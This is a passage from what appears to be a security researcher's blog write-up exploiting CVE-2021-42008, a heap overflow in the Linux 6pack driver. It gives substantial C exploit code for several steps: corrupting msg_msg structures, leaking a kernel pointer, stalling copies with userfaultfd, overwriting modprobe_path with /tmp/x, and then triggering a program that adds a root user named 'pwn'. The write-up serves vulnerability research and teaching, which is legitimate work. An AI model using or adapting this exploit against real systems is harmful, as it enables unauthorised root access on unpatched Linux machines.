            <span class="n">dest</span><span class="p">[</span><span class="n">raw_count</span><span class="p">]</span> <span class="o">=</span>	<span class="p">((</span><span class="n">src</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3c</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">dest</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="p">(</span><span class="n">src</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x03</span><span class="p">);</span>
            <span class="n">dest</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">src</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">uint8_t</span> <span class="o">*</span><span class="nf">generate_payload</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">target</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">encoded</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>

    <span class="c1">// sp-&gt;rx_count_cooked = 0x190
</span>    <span class="n">buff</span><span class="p">[</span><span class="mh">0x194</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span> <span class="c1">// [2]
</span>
    <span class="c1">// sp-&gt;rx_count_cooked = 0x696
</span>    <span class="n">buff</span><span class="p">[</span><span class="mh">0x19a</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x06</span><span class="p">;</span> <span class="c1">// [3]
</span>
    <span class="c1">// fix upper two bytes of msg_msg.m_list.prev
</span>    <span class="n">buff</span><span class="p">[</span><span class="mh">0x19b</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xff</span><span class="p">;</span> <span class="c1">// [4]
</span>    <span class="n">buff</span><span class="p">[</span><span class="mh">0x19c</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xff</span><span class="p">;</span>

    <span class="c1">// msg_msg.m_ts = 0x1100
</span>    <span class="n">buff</span><span class="p">[</span><span class="mh">0x1a6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">;</span> <span class="c1">// [5]
</span>
    <span class="c1">// msg_msg.next = target
</span>    <span class="k">if</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="c1">// [6]
</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
            <span class="n">buff</span><span class="p">[</span><span class="mh">0x1ad</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>

    <span class="n">encoded</span> <span class="o">=</span> <span class="n">sixpack_encode</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span>

    <span class="c1">// sp-&gt;status = 0x18 (to reach decode_data())
</span>    <span class="n">encoded</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x88</span><span class="p">;</span> <span class="c1">// [7]
</span>    <span class="n">encoded</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x98</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">encoded</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">[...]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">generate_payload</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// [1]
</span><span class="n">write</span><span class="p">(</span><span class="n">ptmx</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">LEAK_PAYLOAD_SIZE</span><span class="p">);</span> <span class="c1">// [9]
</span>
<span class="p">[...]</span></code></pre></figure>

<p>We generate and encode our malicious payload calling <strong>generate_paylaod()</strong> <strong>[1]</strong>. As we have seen in the previous paragraphs, we misalign the writing frame of the <strong>decode_data()</strong> function by setting <strong>sp-&gt;rx_count_cooked</strong> to <strong>0x190</strong> <strong>[2]</strong>. Then we overwrite the second byte of <strong>sp-&gt;rx_count_cooked</strong> with <strong>0x6</strong>, making it <strong>0x696</strong> <strong>[3]</strong>. From this point <strong>decode_data()</strong> will continue writing at <strong>sp-&gt;cooked_buf[0x696]</strong> and by doing so it will inevitably corrupt the upper two bytes of the <strong>msg_msg.m_list.prev</strong> pointer. Since we know that the upper two bytes of a heap pointer in kernel space are always <strong>0xffff</strong>, we can easly fix it <strong>[4]</strong>. Then we set <strong>msg_msg.m_ts</strong> to <strong>0x1100</strong>, this will allow us to obtain a powerful Out-Of-Bounds Read primitive calling <strong>recv_msg()</strong>. For now we don’t need to overwrite <strong>msg_msg.next</strong> <strong>[6]</strong>, so we can directly encode our buffer <strong>[7]</strong>, and set the first two bytes of the payload respectively <strong>0x88</strong>, and <strong>0x98</strong>,
 as we have seen in the previous sections, to reach the vulnerable 
function. Since we are skipping the first two bytes (used to reach the 
vulnerable function), we set <strong>sp-&gt;rx_count</strong> to <strong>2</strong> in <strong>sixpack_encode()</strong> <strong>[8]</strong>.</p>

<p>Once we send our malicious payload over the sixpack channel <strong>[9]</strong> and it is decoded by <strong>sixpack_decode()</strong> the situation in memory will be the following:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/8.png" alt=""></p>

<p>We have successfully overwritten <strong>sp-&gt;rx_count_cooked</strong> with <strong>0x696</strong> exploiting the buffer overflow in <strong>sp-&gt;cooked_buf</strong>, and tricked <strong>decode_data()</strong> into continuing to write our malicious payload at <strong>sp-&gt;cooked_buf[0x696]</strong>. By doing so, we successfully overwritten the <strong>m_ts</strong> field of the message. Here is the result of our Out-Of-Bounds Write primitive showed in GDB:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/9.png" alt=""></p>

<p>We can proceed exploiting the Out-Of-Bounds Read:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">close_queue</span><span class="p">(</span><span class="kt">int</span> <span class="n">qid</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">msgctl</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">IPC_RMID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] msgctl()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">find_message_queue</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">tag</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">tag</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">case</span> <span class="mh">0x4141</span><span class="p">:</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">case</span> <span class="mh">0x4242</span><span class="p">:</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">case</span> <span class="mh">0x4343</span><span class="p">:</span> <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">case</span> <span class="mh">0x4444</span><span class="p">:</span> <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
        <span class="k">case</span> <span class="mh">0x4545</span><span class="p">:</span> <span class="k">return</span> <span class="mi">4</span><span class="p">;</span>
        <span class="k">case</span> <span class="mh">0x4646</span><span class="p">:</span> <span class="k">return</span> <span class="mi">5</span><span class="p">;</span>

        <span class="nl">default:</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">leak_pointer</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">leak</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">id</span> <span class="o">&lt;</span> <span class="n">N_MSG</span><span class="p">;</span> <span class="n">id</span> <span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">recv_msg</span><span class="p">(</span><span class="n">qid_A</span><span class="p">[</span><span class="n">id</span><span class="p">],</span> <span class="mh">0x1100</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">leak</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>

        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x220</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">((</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">==</span> <span class="n">INIT_IPC_NS</span><span class="p">)</span> <span class="c1">// [2]
</span>            <span class="p">{</span>
                <span class="n">init_ipc_ns</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
                <span class="n">valid_qid</span> <span class="o">=</span> <span class="n">find_message_queue</span><span class="p">((</span><span class="kt">uint16_t</span><span class="p">)</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="c1">// [3]
</span>                <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">init_ipc_ns</span> <span class="o">-</span> <span class="mh">0x131040</span><span class="p">;</span> <span class="c1">// [4]
</span>                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="p">[...]</span>

<span class="n">leak_pointer</span><span class="p">();</span> <span class="c1">// [1]
</span>
<span class="p">[...]</span></code></pre></figure>

<p>Since we don’t now to which queue belongs the message allocated right after the <strong>sixpack</strong> structure, we use <strong>leak_pointer()</strong> to iterate through all the queues, until we find a <strong>init_ipc_ns</strong> pointer <strong>[2]</strong>. If we find the pointer, it means that we found the correct queue, so we obtain its <strong>QID</strong> comparing the message content thanks to the <strong>find_message_queue()</strong> function <strong>[3]</strong>, and we finally compute the address of <strong>modprobe_path</strong>. If the procedure fails, it means that none of our messages has been allocated after the <strong>sixpack</strong> structure. In this case we can simply launch the exploit again (since we are writing in <strong>kmalloc-4096</strong>
 which is usually not heavily used by the kernel, the probability of a 
crash is relatively low). Here is a visual representation of what 
happens when we trigger the Out-Of-Bounds Read:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/10.png" alt=""></p>

<p>Now that we know the address of our target, <strong>modprobe_path</strong>, we need to get an arbitrary write primitive. We could proceed initializing a new <strong>sixpack</strong> structure, but this would decrease the success rate of our exploit. The question is: is there a way to reuse the <strong>sixpack</strong> structure we just corrupted? The answer is yes! Remember when we analyzed the <strong>tnc_init()</strong> function? Well, when a new sixpack channel is initialized, <strong>tnc_init()</strong> sets a <strong>5 seconds</strong> timer. Once the timer expires, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L503">resync_tnc()</a> is called:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">resync_tnc</span><span class="p">(</span><span class="k">struct</span> <span class="n">timer_list</span> <span class="o">*</span><span class="n">t</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sixpack</span> <span class="o">*</span><span class="n">sp</span> <span class="o">=</span> <span class="n">from_timer</span><span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">resync_t</span><span class="p">);</span>
	<span class="k">static</span> <span class="kt">char</span> <span class="n">resync_cmd</span> <span class="o">=</span> <span class="mh">0xe8</span><span class="p">;</span>

	<span class="cm">/* clear any data that might have been received */</span>

	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// [1]
</span>	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count_cooked</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// [2]
</span>
	<span class="cm">/* reset state machine */</span>

	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// [3]
</span>
        <span class="p">[...]</span>

	<span class="cm">/* Start resync timer again -- the TNC might be still absent */</span>
	<span class="n">mod_timer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">resync_t</span><span class="p">,</span> <span class="n">jiffies</span> <span class="o">+</span> <span class="n">SIXP_RESYNC_TIMEOUT</span><span class="p">);</span> <span class="c1">// [4]
</span><span class="p">}</span></code></pre></figure>

<p>As we can see from the <strong>resync_tnc()</strong> source code, after 5 seconds, the receiver state is reset, meaning that <strong>sp-&gt;rx_count</strong> and <strong>sp-&gt;rx_count_cooked</strong> are set to 0 <strong>[1]</strong> <strong>[2]</strong> and <strong>sp-&gt;status</strong> to  1 <strong>[3]</strong>, then the 5 seconds timer is started again <strong>[4]</strong>. This is exactly what we need, because if we wait for 5 seconds from when we initialized the <strong>sixpack</strong> structure for the first time, we can reuse it and cause a second Out-Of-Bounds Write!</p>

<p>We can proceed initializing <strong>N_THREADS</strong> page fault handler threads (in our case <strong>N_THREADS</strong> is equal to <strong>8</strong>):</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">create_pfh_thread</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ufd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">page</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">pfh_args</span> <span class="o">*</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">pfh_args</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">pfh_args</span><span class="p">));</span>

    <span class="n">args</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">args</span><span class="o">-&gt;</span><span class="n">ufd</span> <span class="o">=</span> <span class="n">ufd</span><span class="p">;</span>
    <span class="n">args</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>

    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tid</span><span class="p">[</span><span class="n">id</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">page_fault_handler</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="p">[...]</span>

<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_THREADS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// [1]
</span><span class="p">{</span>
    <span class="n">mmap</span><span class="p">(</span><span class="n">pages</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">PAGE_SIZE</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span>
            <span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">ufd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">initialize_ufd</span><span class="p">(</span><span class="n">pages</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="p">}</span>


<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_THREADS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">create_pfh_thread</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">ufd</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">pages</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// [2]
</span>
<span class="p">[...]</span></code></pre></figure>

<p>Frist call <strong>mmap()</strong> for 8 times, and each time we map 3 pages of memory. Then for each iteration we start monitoring the second page using <strong>userfaultfd</strong> <strong>[1]</strong>. Then we start 8 page fault handlers <strong>[2]</strong>. Each one of these threads will handle a page fault for a specific page.</p>

<p>We can proceed allocating 8 messages in <strong>kmalloc-4096</strong> and the respective segments in <strong>kmalloc-32</strong>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">alloc_msg_queue_B</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">qid_B</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">msgget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mo">0666</span> <span class="o">|</span> <span class="n">IPC_CREAT</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] msgget"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="o">*</span><span class="nf">allocate_msg</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">;</span>

    <span class="n">debug_printf</span><span class="p">(</span><span class="s">"[Thread %d] Message buffer allocated at 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">id</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">page</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">alloc_msg_queue_B</span><span class="p">(</span><span class="n">id</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
    <span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="p">))[</span><span class="mh">0xff0</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// msg_msg.m_type = 1
</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">msgsnd</span><span class="p">(</span><span class="n">qid_B</span><span class="p">[</span><span class="n">id</span><span class="p">],</span> <span class="n">page</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x1018</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// [4]
</span>    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] msgsnd"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">debug_printf</span><span class="p">(</span><span class="s">"[Thread %d] Message sent!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">id</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">create_message_thread</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">page</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">t_args</span><span class="p">));</span>

    <span class="n">args</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">args</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>

    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tid</span><span class="p">[</span><span class="n">id</span> <span class="o">+</span> <span class="mi">2</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">allocate_msg</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="p">[...]</span>

<span class="n">close_queue</span><span class="p">(</span><span class="n">qid_A</span><span class="p">[</span><span class="n">valid_qid</span><span class="p">]);</span> <span class="c1">// [1]
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">generate_payload</span><span class="p">(</span><span class="n">modprobe_path</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">);</span> <span class="c1">// [2]
</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_THREADS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">create_message_thread</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">pages</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// [3]
</span>
<span class="n">waitfor</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s">"Waiting for resync_tnc callback..."</span><span class="p">);</span> <span class="c1">// [5]
</span>
<span class="p">[...]</span></code></pre></figure>

<p>First of all we close the queue to which belongs the message allocated right after the <strong>sixpack</strong> structure <strong>[1]</strong>.
 This will free the message and its respective segment, creating a hole 
in the heap, allowing us to allocate another message in the same 
location (because of freelist LIFO behavior). We re-generate our 
malicious payload, this time using <strong>modprobe_path - 0x8</strong> as target <strong>[2]</strong>. This will set the <strong>msg_msg.next</strong> pointer to <strong>modprobe_path - 0x8</strong>. We are subtracting 8 bytes from <strong>modprobe_path</strong> because the first QWORD of a segment must be NULL, otherwise <strong>load_msg()</strong> will try to access the next segment causing a crash. Afterwards, we create 8 threads using <strong>create_message_thread()</strong> <strong>[3]</strong>. Each one of these threads will allocate a new message in <strong>kmalloc-4096</strong>. For each thread, we place the message buffer, right 0x10 bytes before the monitored page <strong>[4]</strong>, this way the <strong>copy_from_user()</strong> call in <strong>load_msg()</strong> will cause a page fault, and we will be able suspend the copy operation from user space. Finally we sleep for 6 seconds <strong>[5]</strong>, this way the function <strong>resync_tnc()</strong> will be called by the kernel resetting the <strong>sixpack</strong> receiver state. All this will cause the following situation in memory:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/11.png" alt=""></p>

<p>As we can see, one of the messages has been allocated right after the <strong>sixpack</strong> structure. The allocation of the message and the successive <strong>load_msg()</strong>
 call, caused a page fault, and we successfully suspended the copy 
operation. It is important to note that even in this case we don’t know 
to which queue belongs the message allocated after the <strong>sixpack</strong> structure, so I identified the queue with <strong>QID #Y</strong>.</p>

<p>We are ready to send our malicious payload over the <strong>sixpack</strong> channel:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">[...]</span>

<span class="n">puts</span><span class="p">(</span><span class="s">"[*] Overwriting modprobe_path..."</span><span class="p">);</span>
<span class="n">write</span><span class="p">(</span><span class="n">ptmx</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">WRITE_PAYLOAD_SIZE</span><span class="p">);</span> <span class="c1">// [1]
</span>
<span class="p">[...]</span></code></pre></figure>

<p>Once we send the malicious payload <strong>[1]</strong>, it will misalign the writing frame as we have seen in the previous paragraphs, setting <strong>sp-&gt;rx_count_cooked</strong> to <strong>0x190</strong>, then it will set it to <strong>0x696</strong> tricking <strong>decode_data()</strong> into continuing to write into the next object in memory: <strong>MSG #0</strong> in <strong>QID #Y</strong>. Finally it will overwrite multiple fields in the <strong>msg_msg</strong> structure, including the <strong>next</strong> pointer. Now <strong>msg_msg.next</strong>, instead of pointing to the segment, points to <strong>modprobe_path - 0x8</strong>:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/12.png" alt=""></p>

<p>We can finally release every page fault:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">[...]</span>

<span class="n">release_pfh</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

<span class="p">[...]</span></code></pre></figure>

<p>Once we release every page fault, the <strong>modprobe_path</strong> string (set by default to <strong>“/sbin/modprobe”</strong>) will be overwritten with the path of our malicious program <strong>“/tmp/x”</strong>:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/13.png" alt=""></p>

<p>In the final stage, we trigger the call to <strong>/sbin/modprobe</strong>, now replaced with <strong>/tmp/x</strong>, and we verify if the new user with root privileges has been added:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">[...]</span>

<span class="n">system</span><span class="p">(</span><span class="s">"/tmp/asd 2&gt;/dev/null"</span><span class="p">);</span> <span class="c1">// [1]
</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">getpwnam</span><span class="p">(</span><span class="s">"pwn"</span><span class="p">))</span> <span class="c1">// [2]
</span><span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[X] Exploit failed, try again..."</span><span class="p">);</span>
    <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">puts</span><span class="p">(</span><span class="s">"[+] We are root!"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"rm /tmp/asd &amp;&amp; rm /tmp/x"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"su pwn"</span><span class="p">);</span>

<span class="p">[...]</span></code></pre></figure>

<p>First we execute a program with an unknown program header <strong>[1]</strong> forcing the kernel to call <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/kernel/kmod.c#L124">__request_module()</a> → <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/kernel/kmod.c#L69">call_modprobe()</a> → <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/kernel/umh.c#L402">call_usermodehelper_exec()</a> and execute our malicious program, then we check if the user <strong>pwn</strong> <strong>[2]</strong> has been added using <a href="https://linux.die.net/man/3/getpwnam">getpwnam()</a>. If the user exists, we can use <strong>su pwn</strong> to become root, otherwise we simply need to launch the exploit again.</p>

<p>Here is the exploit in action:</p>

